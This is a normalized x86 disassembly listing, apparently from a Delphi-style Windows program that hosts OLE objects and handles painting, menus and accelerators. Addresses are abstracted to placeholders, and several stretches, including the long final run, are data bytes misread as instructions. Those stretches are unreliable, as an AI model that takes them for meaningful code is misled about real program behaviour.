mov eax ebx
call sub_410254
mov [ ebp - 0xc ] eax
sub esi 0xfffffda1
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbb
call sub_40358c
sub esi 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
mov dl [ ebp - 0xf ]
mov [ eax ] dl
jmp r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd3
call sub_40358c
dec esi
je r-xdata
mov eax [ ebx + 0x18 ]
mov dx [ ebp - 0xe ]
mov [ eax ] dx
jmp r-xdata
test [ ebx + 0x11 ] 0x40
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbc
call sub_40358c
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx edi
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_40358c
jmp r-xdata
dec esi
jne r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd5
call sub_40358c
jmp r-xdata
sub_476260
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0xbd00
jb r-xdata
mov eax [ esi ]
sub eax 0xb008
je r-xdata
cmp eax 0xbd08
ja r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44b180
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
jmp r-xdata
mov eax ebx
call sub_44d7a4
mov [ esp ] eax
mov eax [ esi ]
sub eax 0xbc00
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov [ esp + 0xc ] eax
call GetMessageTime
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] 0x115de1f1
mov [ esp + 0x18 ] 0x115de1f1
push esp
mov eax [ ebx + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
push 0xfffffd41
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
push 0xfffffd40
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
push 0xfffffd43
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
add esp 0x1c
pop esi
pop ebx
retn
sub_476348
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
setne [ ebp - 0x5 ]
xor eax eax
push ebp
push j_sub_40399c#2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_476407
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_4763e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalSize
mov ecx eax
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4763eb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
mov eax [ ebp - 0x4 ]
call sub_47505c
sub_47640e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47641d
add [ eax ] eax
add [ eax ] al
nop
je r-xdata
retn
add [ ecx ] ch
inc edi
add [ ecx - 0x742c743d ] cl
inc ebp
cld
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
jne r-xdata
call sub_403bd8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403b84
sub_476450
push esi
mov esi eax
test [ esi + 0x23d ] 0x4
jne r-xdata
mov eax esi
call sub_44bbc0
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_476470
push ebx
push esi
push edi
add esp 0xffffffb0
mov edi edx
mov ebx eax
test [ ebx + 0x23d ] 0x4
je r-xdata
mov edx edi
mov eax ebx
call sub_44b8fc
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
lea edx [ esp + 0x40 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x1
mov eax [ ebx + 0x218 ]
push eax
call OleDraw
cmp [ edi + 0x4 ] 0x0
jne r-xdata
push esp
mov eax ebx
call sub_44d7a4
push eax
call BeginPaint
mov esi eax
add esp 0x50
pop edi
pop esi
pop ebx
retn
push esp
mov eax ebx
call sub_44d7a4
push eax
call EndPaint
jmp r-xdata
sub_4764e0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
call sub_45dd9c
mov edi eax
xor ebx ebx
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
test ebx ebx
je r-xdata
mov ebx edi
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp + 0x4 ]
push eax
mov eax [ esi + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push esi
call sub_476d80
sub_47653c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cca0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44daa8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_4765b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x70 ]
mov edx 0xfffffe0b
mov eax [ ebp - 0x4 ]
call sub_475bb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x0
retn
sub_4765c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cc58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44daa8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_47663f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb ecx ecx
mov edx 0xfffffdfe
mov eax [ ebp - 0x4 ]
call sub_475c9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x0
retn
sub_47664c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_476741
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44ccc8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x6
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476748
lea eax [ ebp - 0x14 ]
call sub_40f638
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44daa8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_476724
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x18 ]
mov edx 0xfffffdff
mov eax [ ebp - 0x4 ]
call sub_475bd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x0
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_47468c
lea ecx [ ebp - 0x14 ]
mov edx 0xfffffe00
mov eax [ ebp - 0x4 ]
call sub_476008
sub_47674c
push ebx
push esi
push edi
add esp 0xffffffd0
mov edi edx
mov ebx eax
mov eax ebx
mov si 0xffb8
call sub_40358c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44cbe8
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
lea eax [ esp + 0x14 ]
xor ecx ecx
mov edx 0x1c
call sub_402da4
mov eax ebx
call sub_44d7a4
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x100
mov eax [ edi + 0x4 ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x8 ]
mov [ esp + 0x20 ] eax
push esp
lea eax [ esp + 0x18 ]
push eax
movzx eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push eax
call IsAccelerator
test eax eax
je r-xdata
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
add esp 0x30
pop edi
pop esi
pop ebx
retn
sub_476804
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_45dd9c
test eax eax
je r-xdata
mov edx esp
mov eax ebx
call sub_446924
push esp
mov eax ebx
call sub_44d5a0
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
cmp ebx [ eax + 0x27c ]
je r-xdata
push eax
push 0x0
push 0xfffffffc
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
sub eax 0xfffffd9c
add esp 0x10
pop ebx
retn
sub_476854
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45dd9c
mov esi eax
test esi esi
je r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
cmp ebx [ esi + 0x27c ]
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
pop esi
pop ebx
retn
cmp ebx [ esi + 0x220 ]
jne r-xdata
push 0x0
push ebx
call sub_476c48
sub_47689c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403444
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_476950
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call MulDiv
mov esi eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edi eax
test [ ebx + 0x23d ] 0x4
je r-xdata
push esi
push edi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi 0x20
jle r-xdata
cmp edi 0x20
jle r-xdata
mov esi 0x20
mov edi 0x20
sub_476a24
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
test [ ebp + 0x14 ] 0x4
je r-xdata
fld [ esi ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_402b60
mov [ ebx ] eax
fld [ esi + 0x4 ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_402b60
mov [ ebx + 0x4 ] eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi ]
fwait
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi + 0x4 ]
fwait
jmp r-xdata
xor eax eax
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_476af4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
mov eax ebx
call sub_44d5a0
mov [ esi ] eax
cmp [ esi ] 0x0
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi 0x80004005
sub_476b2c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x22c ]
call sub_405b50
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
lea eax [ ebx + 0x230 ]
call sub_405b50
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_476b72
add [ eax ] al
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop ss
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl 0x1
call sub_475fb8
xor eax eax
pop ebp
retn 0x4
sub_476ba8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov edx ebx
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_405b68
mov eax [ ebp + 0x10 ]
call sub_405b50
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_446924
mov eax [ ebp + 0x14 ]
push esi
lea esi [ ebp - 0x10 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0x7fff
push 0x7fff
push 0x0
push 0x0
mov eax [ ebp + 0x18 ]
push eax
call SetRect
xor eax eax
mov [ esi + 0x4 ] eax
mov eax ebx
call sub_44d5b8
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0xc ] eax
xor eax eax
mov [ esi + 0x10 ] eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub edx 0xfffffda8
sub_476c48
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push ebx
call sub_476d80
xor edx edx
mov eax ebx
call sub_475fb8
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_476d40
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ ebp + 0x8 ]
call sub_4754b4
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0xc
push 0x2
mov edx [ ebp + 0x10 ]
push edx
push 0x5
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0x2
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
call sub_45aeec
sub_476d80
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
call sub_4754b4
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn 0x10
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45af3c
push 0x0
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call OleSetMenuDescriptor
sub_476e84
mov ebp [ edi + 0x47 ]
add [ eax - 0x69ffb891 ] al
outsd
inc edi
add [ ebp + 0x6f ] dh
inc edi
add [ edx + 0x6f ] ch
inc edi
add [ edx + 0x6f ] bl
inc edi
add [ edi + 0x6f ] al
inc edi
add [ esi - 0x69ffb891 ] dl
outsd
inc edi
add [ edi + ebp * 2 ] bh
inc edi
add [ edx ] ch
outsd
inc edi
add [ ecx ] bl
outsd
inc edi
add bl ch
outsb
inc edi
add cl dl
outsb
inc edi
add al al
outsb
inc edi
add [ ebx + 0x70568bc3 ] cl
mov cl 0xfc
call sub_413a2c
jmp sub_476fa2
sub_476eeb
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov esi [ esi + 0x68 ]
cmp [ esi + 0x59 ] 0x0
je r-xdata
mov esi [ eax + 0x68 ]
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_47468c
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_40f94c
jmp sub_476fa2
sub_476fd8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4771dc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_40399c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
sub eax 0xfffffdfe
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_4770db
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdfe
mov eax [ ebp + 0x8 ]
call sub_475504
cmp ax 0x1
sbb edx edx
inc edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
dec eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4771e3
lea eax [ ebp - 0x10 ]
call sub_40f638
retn
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_47719d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdff
mov eax [ ebp + 0x8 ]
call sub_4754a0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x68 ]
call sub_426e3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
sub eax 0xb
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_477140
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx 0xfffffe00
mov eax [ ebp + 0x8 ]
call sub_475624
lea eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x68 ]
call sub_4746d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_477078
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffe0b
mov eax [ ebp + 0x8 ]
call sub_4754a0
mov edx eax
mov eax [ ebp + 0x8 ]
call sub_447124
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x0
retn
sub_477214
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_477245
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47724c
retn
mov eax rw-data
call sub_40f638
sub_477250
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_477298
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47729f
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
mov eax rw-data
mov edx [ rw-data ]
call sub_40f94c
sub_4772a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4772c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4772d0
retn
sub_4772dc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_409c80
test al al
jne r-xdata
and eax 0x7f
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
lea eax [ edx + eax * 8 ]
movzx edx bx
mov ax [ eax + edx * 2 - 0x2 ]
pop esi
pop ebx
retn
mov al 0x1
sub_477314
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_477339
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477340
retn
sub_47734c
push 0xbd004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ esi + 0x680000fe ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x680000fe ] bh
jbe r-xdata
inc edi
add [ ecx ] bl
inc ecx
add ah dh
inc cx
add [ eax ] al
inc ecx
add [ eax ] dh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x47 ] al
add [ eax + eax ] dl
add [ eax ] al
test [ ebx + 0x41 ] ch
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x2bffbea1 ] al
pushad
inc ecx
add [ eax ] dl
pushad
inc ecx
add [ eax + 0x41 ] al
add [ eax ] ah
inc ecx
add [ eax ] dh
inc ecx
add [ eax ] cl
inc ecx
add [ eax + 0x7b ] bl
inc edi
add [ esp + edi * 2 + 0x5c780047 ] al
inc ecx
add [ eax + 0x7b ] cl
inc edi
add [ ebp + edi * 2 + 0x7dfc0047 ] ch
inc edi
add [ eax + 0x60 ] bl
inc ecx
add [ eax + 0x5c ] al
inc ecx
add [ eax ] dh
jle r-xdata
add [ eax + 0x550000fe ] ah
mov ebp esp
xor eax eax
push ebp
push sub_477391
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477398
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
jae r-xdata
popad
je r-xdata
add [ eax ] al
add ah ch
pop [ ecx ]
fdiv [ 0x35e40040 ]
add [ eax ] al
add [ eax ] al
mov eax 0x14004774
add [ eax - 0x7ffbe8d ] ah
jge r-xdata
add eax [ ecx + 0x79 ]
xchg esp eax
popad
je r-xdata
add [ eax ] al
mov eax eax
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ esp + edi * 4 ] ah
inc ecx
add al bl
xor eax 0x35e40040
add [ eax ] bl
push esp
push ebx
push ecx
dec esp
push esp
imul ebp [ ebp + 0x65 ] 0x6d617453
jo r-xdata
dec ebp
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] 0x40108073
add [ edx ] cl
add [ eax ] al
jmp [ eax ]
push esp
imul ebp [ ebp + 0x65 ] r-xdata
push esp
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x694d0600
outsb
jne r-xdata
imul ebp [ esi + 0x67 ] r-xdata
add [ ecx + edi * 2 + 0x10047 ] al
popad
je r-xdata
inc ecx
add [ ecx ] dl
push esp
mov esp 0xbd340041
popad
jb r-xdata
add [ ebp + 0x6 ] dh
adc [ eax ] 0x40
add [ esi ] cl
add [ eax ] al
add [ ecx ] al
adc [ eax ] al
or al [ eax ]
add bh bh
and [ ebx + 0x47 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040004 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46090003 ] al
jb r-xdata
add [ ebp + 0x1b ] dh
adc [ gs : eax ] 0x40
insd
push ebx
je r-xdata
adc [ eax ] al
adc [ eax ] al
add bh bh
sbb al 0x7b
inc edi
add [ ecx ] al
or [ eax ] al
lodsb [ esi ]
je r-xdata
insd
push ebx
je r-xdata
popad
outsb
je r-xdata
mov al 0x1
retn
xor eax eax
retn
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
add al 0x59
add [ esi ] al
add [ eax ] al
push [ eax ]
jpo r-xdata
adc [ eax ] 0x40
add [ eax + eax ] cl
add bh bh
sub [ ebx + 0x47 ] bh
add [ ecx ] al
cmp [ eax + 0x8 ] 0x0
jne r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x59040008 ] al
outsd
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d050006 ] al
test al 0x79
inc edi
add ah bl
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
or [ ecx + 0x73 ] al
push ebx
add [ eax - 0x70 ] ah
inc ecx
add [ ecx ] cl
add [ eax ] cl
push ebx
jno r-xdata
test [ ecx + 0x47 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080001 ] al
jae r-xdata
jo r-xdata
insd
inc ecx
add [ edi * 4 - 0x43afffbf ] bh
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d060005 ] al
imul ebp [ esi + 0x75 ] 0x10806574
inc eax
shl [ esi - 0x7d ] 0x38
add [ ebp + 0x29 ] dh
cmp [ eax + 0x2 ] 0x0
jne r-xdata
cmp [ eax + 0xa ] 0x0
jne r-xdata
add bh bh
adc al 0x7b
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44030002 ] al
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1004779 ] ch
jns r-xdata
